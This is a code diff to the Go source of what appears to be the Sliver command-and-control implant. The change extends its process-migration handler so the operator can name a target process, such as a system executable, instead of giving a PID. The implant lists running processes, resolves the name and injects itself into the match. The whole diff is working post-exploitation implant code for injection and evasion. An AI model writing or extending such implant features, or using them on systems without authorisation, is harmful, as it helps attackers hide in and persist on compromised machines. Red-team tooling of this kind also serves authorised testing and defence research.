@@ -25,6 +25,7 @@ import (
 	"io"
 	"os"
 	"runtime"
+	"strings"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -36,6 +37,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/extension"
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
+	"github.com/bishopfox/sliver/implant/sliver/ps"
 	"github.com/bishopfox/sliver/implant/sliver/registry"
 	"github.com/bishopfox/sliver/implant/sliver/service"
 	"github.com/bishopfox/sliver/implant/sliver/spoof"
@@ -452,6 +454,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
 	migrateReq := &sliverpb.InvokeMigrateReq{}
+	var migrateResp sliverpb.Migrate = sliverpb.Migrate{}
 	err := proto.Unmarshal(data, migrateReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -459,21 +462,60 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
-	// {{if .Config.Debug}}
-	log.Println("migrateHandler: RemoteTask called")
-	// {{end}}
-	migrateResp := &sliverpb.Migrate{Success: true}
-	if err != nil {
-		migrateResp.Success = false
-		migrateResp.Response = &commonpb.Response{
-			Err: err.Error(),
+
+	if migrateReq.Pid == 0 {
+		if migrateReq.ProcName == "" {
+			// {{if .Config.Debug}}
+			log.Println("pid nor process name were specified")
+			// {{end}}
+			migrateResp.Success = false
+			migrateResp.Response = &commonpb.Response{}
+		} else {
+			// Search for the PID
+			processes, err := ps.Processes()
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("failed to list procs %v", err)
+				// {{end}}
+				migrateResp.Success = false
+				migrateResp.Response = &commonpb.Response{}
+			} else {
+				for _, proc := range processes {
+					if strings.EqualFold(proc.Executable(), migrateReq.ProcName) {
+						migrateReq.Pid = uint32(proc.Pid())
+						break
+					}
+				}
+				if migrateReq.Pid == 0 {
+					// If the Pid is still zero after grabbing a list of processes, then the process name does not exist
+					// {{if .Config.Debug}}
+					log.Printf("Could not find process with name %s", migrateReq.ProcName)
+					// {{end}}
+					migrateResp.Success = false
+					migrateResp.Response = &commonpb.Response{}
+				}
+			}
 		}
-		// {{if .Config.Debug}}
-		log.Println("migrateHandler: RemoteTask failed:", err)
-		// {{end}}
 	}
-	data, err = proto.Marshal(migrateResp)
+
+	if migrateResp.Response == nil {
+		err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
+		// {{if .Config.Debug}}
+		log.Println("migrateHandler: RemoteTask called")
+		// {{end}}
+		migrateResp = sliverpb.Migrate{Success: true, Pid: migrateReq.Pid}
+		if err != nil {
+			migrateResp.Success = false
+			migrateResp.Response = &commonpb.Response{
+				Err: err.Error(),
+			}
+			// {{if .Config.Debug}}
+			log.Println("migrateHandler: RemoteTask failed:", err)
+			// {{end}}
+		}
+	}
+
+	data, err = proto.Marshal(&migrateResp)
 	resp(data, err)
 }
 
